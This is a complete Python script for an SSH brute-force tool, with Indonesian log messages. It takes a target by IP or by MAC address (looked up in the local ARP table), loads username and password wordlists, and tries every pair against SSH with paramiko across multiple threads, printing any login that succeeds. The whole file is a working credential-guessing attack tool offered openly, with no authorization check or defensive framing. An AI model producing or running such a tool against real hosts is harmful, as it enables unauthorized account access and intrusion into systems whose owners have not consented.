import paramiko
import argparse
from concurrent.futures import ThreadPoolExecutor
import subprocess
import time
import re
import sys

paramiko.util.log_to_file("paramiko.log")

def get_ip_from_mac(mac_address):
    mac_address = mac_address.lower()
    try:
        output = subprocess.check_output(["ip", "neigh"]).decode()
        for line in output.strip().split('\n'):
            match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+dev\s+\S+\s+lladdr\s+(\S+)\s+\S+", line)
            if match:
                ip, mac = match.groups()
                if mac.lower() == mac_address:
                    return ip
    except Exception as e:
        print(f"[!] Gagal membaca ARP table: {e}")
    return None

def try_login(host, port, username, password, timeout=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)
        print(f"[+] LOGIN BERHASIL --> {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Gagal: {username}:{password}")
    except Exception as e:
        print(f"[!] Error saat login {username}:{password} --> {e}")
    finally:
        client.close()
    return False

def load_list_from_file(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool (support IP or MAC address input)")
    
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--host", help="IP address atau hostname target")
    target_group.add_argument("--mac", help="MAC address target (harus ada di ARP table)")

    parser.add_argument("--port", type=int, default=22, help="Port SSH (default: 22)")

    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("--user", help="Username tunggal target")
    user_group.add_argument("--userlist", help="Path ke file daftar username")

    parser.add_argument("--wordlist", required=True, help="Path ke file daftar password")
    parser.add_argument("--threads", type=int, default=4, help="Jumlah threads (default: 4)")

    args = parser.parse_args()

    # Resolve IP dari MAC jika perlu
    target_ip = args.host
    if args.mac:
        target_ip = get_ip_from_mac(args.mac)
        if not target_ip:
            print(f"[!] IP untuk MAC {args.mac} tidak ditemukan di ARP table.")
            sys.exit(1)
        print(f"[INFO] Ditemukan IP {target_ip} untuk MAC {args.mac}")

    usernames = [args.user] if args.user else load_list_from_file(args.userlist)
    passwords = load_list_from_file(args.wordlist)

    print(f"[INFO] Memulai brute-force ke {target_ip} dengan {len(usernames)} user dan {len(passwords)} password (max {args.threads} threads)")
    time.sleep(0.2)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for username in usernames:
            for password in passwords:
                executor.submit(try_login, target_ip, args.port, username, password)

if __name__ == "__main__":
    main()
